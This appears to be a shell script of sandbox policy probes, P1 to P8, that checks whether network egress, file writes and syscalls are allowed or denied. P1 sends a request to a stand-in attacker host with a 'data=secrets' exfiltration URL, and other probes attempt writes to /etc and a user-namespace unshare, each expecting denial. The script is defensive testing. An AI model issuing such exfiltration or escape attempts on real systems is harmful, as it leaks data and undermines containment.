cd /sandbox/guardops 2>/dev/null || cd /sandbox
# GuardOps OpenShell probe set — run inside the sandbox: openshell sandbox exec -n guardops -- bash -s < scripts/openshell_probes.sh
# Each probe prints the policy rule it tests (P1..P7) and the observed outcome.
echo "== sandbox: $(uname -srm) | $(id -un) | python3 -> $(readlink -f /usr/bin/python3) | cwd=$(pwd)"
py() { python3 - "$@" <<'PY'
import sys, urllib.request
method, url = sys.argv[1], sys.argv[2]
try:
    req = urllib.request.Request(url, method=method, data=(b"{}" if method == "POST" else None),
                                 headers={"Content-Type": "application/json"})
    r = urllib.request.urlopen(req, timeout=15)
    print(f"HTTP {r.status}")
except urllib.error.HTTPError as e:
    print(f"HTTP {e.code} {e.reason}")
except Exception as e:
    print(f"BLOCKED {type(e).__name__}: {str(e)[:120]}")
PY
}
echo; echo "[P1] python3 GET https://attacker.example/exfil (not in policy)      expect: DENIED";  py GET "https://attacker.example/exfil?data=secrets"
echo; echo "[P2] curl   GET https://integrate.api.nvidia.com/v1/models (binary not allowed) expect: DENIED"; curl -sS -m 15 -o /dev/null -w "HTTP %{http_code}\n" https://integrate.api.nvidia.com/v1/models 2>&1 | tail -1
echo; echo "[P3] python3 GET https://integrate.api.nvidia.com/v1/models (allowed rule) expect: ALLOWED"; py GET "https://integrate.api.nvidia.com/v1/models"
echo; echo "[P4] python3 POST https://integrate.api.nvidia.com/v1/embeddings (L7 path not allowed) expect: DENIED"; py POST "https://integrate.api.nvidia.com/v1/embeddings"
echo; echo "[P5] python3 GET https://nvd.nist.gov/search?q=SECRET (L7 path not allowed)   expect: DENIED"; py GET "https://nvd.nist.gov/search?q=SECRET_DATA"
echo; echo "[P6] Landlock: write /etc/guardops_probe (read-only)                         expect: denied"; (touch /etc/guardops_probe && echo "WROTE (unexpected)") 2>&1 | tail -1
echo; echo "[P7] Landlock: write /sandbox/guardops_probe (read-write)                    expect: ok"; (touch /sandbox/guardops_probe && echo "ok: write permitted") 2>&1 | tail -1
echo; echo "[P8] syscall filter: unshare --user (new user namespace)                 expect: denied"; (unshare --user --map-root-user true && echo "UNSHARE SUCCEEDED (not filtered)") 2>&1 | tail -1
